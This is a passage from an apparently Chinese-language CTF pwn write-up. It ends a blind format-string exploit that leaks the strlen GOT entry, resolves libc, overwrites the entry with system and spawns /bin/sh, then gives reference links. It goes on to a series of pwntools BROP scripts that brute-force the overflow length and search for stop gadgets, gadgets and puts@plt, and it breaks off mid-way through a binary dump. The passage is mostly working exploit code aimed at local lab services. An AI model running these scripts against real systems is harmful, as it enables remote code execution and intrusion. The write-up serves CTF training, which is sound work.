        len1 = len(payload_forward)
        key_temp = []
        for i in range(len(key_offset_fmtCount)):
            key_temp.append(key_offset_fmtCount[i])
        x_add = 0
        y_add = 0
        while True:
            x_add = len1 / 8 + 1
            y_add = 8 - (len1 % 8)
            for i in range(len(key_temp)):
                key_temp[i] = key_offset_fmtCount[i] + x_add
            payload_temp = ""
            for i in range(0,number):
                if key_toadd[i] != 0:
                    payload_temp += "%{}c".format(key_toadd[i])
                payload_temp += "%{}${}n".format(key_temp[i], formatz)
            len2 = len(payload_temp)
            xchange = y_add - (len2 - len1)
            if xchange >= 0:
                payload = payload_temp + xchange*'a' + payload_last
                return payload;
            else:
                len1 = len2
    #dump bin can not be loaded
    #but can analysis
    offset = 8
    #step 1 leak the printf_got
    #maybe plt 08048400
    strlen_got = 0x601020
    strlen_leak = "%9$s" + "SEND" + p64(strlen_got)
    io.send(strlen_leak)
    io.recvuntil('Repeater:')
    libc_strlen = u64(io.recvuntil('SEND', drop=True).ljust(8, '\x00'))
    print hex(libc_strlen)
    #libc_printf = u64(io.recv()[8:16])
    #print hex(libc_printf)
    io.recv()
    #step 2 find the libc
    libc = LibcSearcher('strlen',libc_strlen)
    libcbase = libc_strlen - libc.dump('strlen')
    system_addr = libcbase + libc.dump('system')
    print hex(system_addr)
    #step 3 cover the address
    payload_antitone = antitone_fmt_payload(8,{strlen_got : system_addr},write_size='short',numbwritten=9)
    #payload_cover = fmtstr_payload(8,{putchar_got : system_addr},write_size='short')
    io.sendline(payload_antitone)
    io.recv()
    #step 4 get shell
    #time.sleep(10)
    io.sendline(";/bin/sh\x00")
    #io.recv()
    print hex(system_addr)
    io.interactive()
**参考链接**
  * [陌小生](https://www.xmsec.cc/format-string-leak-binary-blind-pwn/)
  * [默小西](http://momomoxiaoxi.com/2017/12/26/Blindfmtstr/)
  * [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#1-)
  * pwntools官方文档...
## BROP
标准的brop的思路,本来出题想要加上canary以及write和strcmp,可惜环境容易崩,测试的时候,总是崩溃....没法上题
emm...步骤比较多
nc链接上去,发现,输入了,然后回显,然后没了...
使用%p也没用...那就猜测是否是否有栈区溢出
**暴力破解-获取偏移**
猜测是否有栈区溢出
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    ip = "0.0.0.0"
    port = 10001
    def getbufferflow_length():
        i = 1
        while True:
            try:
                io = remote(ip,port)
                io.recvuntil("Please tell me:")
                io.sendline(i*'a')
                output = io.recvuntil("Goodbye!\n",timeout=1)
                print output
                #hello = io.recv()
                io.close()
                #print "[*] the index is " + str(output.find('Goodbyte!'))
                if output == "":
                    return i - 1
                else:
                    i += 1
            except EOFError:
                io.close()
                return i - 1
    length = getbufferflow_length()
    print length
**获取stop_gadget--main**
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    gadget_array = []
    def get_stop_addr(length):
        addr = 0x4007D0#7D0
        while 1:
            try:
                sh = remote('127.0.0.1', 10001)
                sh.recvuntil("Please tell me:")
                payload = 'a' * length + p64(addr)
                sh.sendline(payload)
                #sh.recvuntil("Repeater:")
                sh.recv()
                recvstr = sh.recv()
                sh.close()
                if recvstr.startswith('Hello'):
                    gadget_array.append(addr)
                    return gadget_array
                print 'one success addr: 0x%x' % (addr)
                addr += 1
            except Exception:
                addr += 1
                sh.close()
    length = 216
    stop_gadget = get_stop_addr(length)
    for i in range(len(stop_gadget)):
        print 'one success addr: 0x%x' % (stop_gadget[i])
    #0x4007d6
**获取brop_gadget--libc_csu_init**
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    def get_brop_gadget(length, stop_gadget, addr):
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('Please tell me:')
            payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
                stop_gadget) + p64(0) * 10
            sh.sendline(payload)
            sh.recv()
            content = sh.recv()
            sh.close()
            print content
            # stop gadget returns memory
            if not content.find('Hello'):
                return False
            return True
        except Exception:
            sh.close()
            return False
    def check_brop_gadget(length, addr):
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('Please tell me:')
            payload = 'a' * length + p64(addr) + 'a' * 8 * 10
            sh.sendline(payload)
            sh.recv()
            content = sh.recv()
            sh.close()
            return False
        except Exception:
            sh.close()
            return True
    length = 216
    stop_gadget = 0x4007d6
    addr = 0x4007d6#libc_scu_init is behind from main
    while 1:
        print hex(addr)
        if get_brop_gadget(length, stop_gadget, addr):
            print 'possible brop gadget: 0x%x' % addr
            if check_brop_gadget(length, addr):
                print 'success brop gadget: 0x%x' % addr
                break
        addr += 1
    #0x40095a
**获取puts_plt**
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    def get_puts_addr(length, rdi_ret, stop_gadget):
        addr = 0x400630
        while 1:
            print hex(addr)
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('Please tell me:')
            payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
                addr) + p64(stop_gadget)
            sh.sendline(payload)
            try:
                sh.recv()
                content = sh.recv()
                if content.find('\x7fELF'):
                    print 'find puts@plt addr: 0x%x' % addr
                    return addr
                sh.close()
                addr += 1
            except Exception:
                sh.close()
                addr += 1
    length = 216
    stop_gadget = 0x4007d6
    brop_gadget = 0x40095a
    rdi_ret = brop_gadget + 9
    puts_plt = get_puts_addr(length,rdi_ret,stop_gadget)
    print hex(puts_plt)
    #0x400635
**dump文件**
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    def leakfunction(length, rdi_ret, puts_plt, stop_gadget):
        addr = 0x4005fd#0x400000
        result = ""
        offset = 0
        while addr < 0x401000:
            #print hex(addr)
            data = leak(length, rdi_ret, puts_plt, addr+offset, stop_gadget)
            print "data is " + data
            if data is None: